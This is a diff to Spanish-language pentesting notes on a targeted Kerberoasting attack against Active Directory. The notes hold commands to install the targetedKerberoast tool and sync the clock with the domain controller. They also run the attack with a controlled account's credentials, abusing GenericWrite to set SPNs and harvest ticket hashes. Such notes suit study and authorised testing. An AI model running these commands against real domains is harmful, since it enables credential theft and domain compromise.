@@ -14,9 +14,7 @@ Ataques:
 
 ```bash 
 # Instalación
-❯ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
-❯ cd targetedKerberoast
-❯ pip3 install -r requirements.txt --break-system-packages
+❯ git clone https://github.com/ShutdownRepo/targetedKerberoast.git && cd targetedKerberoast && pip3 install -r requirements.txt --break-system-packages
 ```
 
 ```bash 
@@ -24,13 +22,15 @@ Paso 1:
 # Sincronizar el reloj con el DC
 ❯ sudo timedatectl set-ntp false
 ❯ sudo ntpdate IP_DC
+
 # o
+
 ❯ sudo chronyd -q 'server IP_DC iburst'
 ```
 
 ```powershell 
 Paso 2:
-❯ targetedKerberoast.py -u "ControlledAccount" -p "password" -d "domain" --dc-ip IP
+❯ python3 targetedKerberoast.py -u "ControlledAccount" -p "password" -d "domain" --dc-ip IP
 # Esto lo hace para todos los usuarios y al usuario que encuentre con el permiso de GenericWrite le escribe temporal sobre el atributo SPN para obtener el TGT. 
 
 	# u = Usuario atacante 
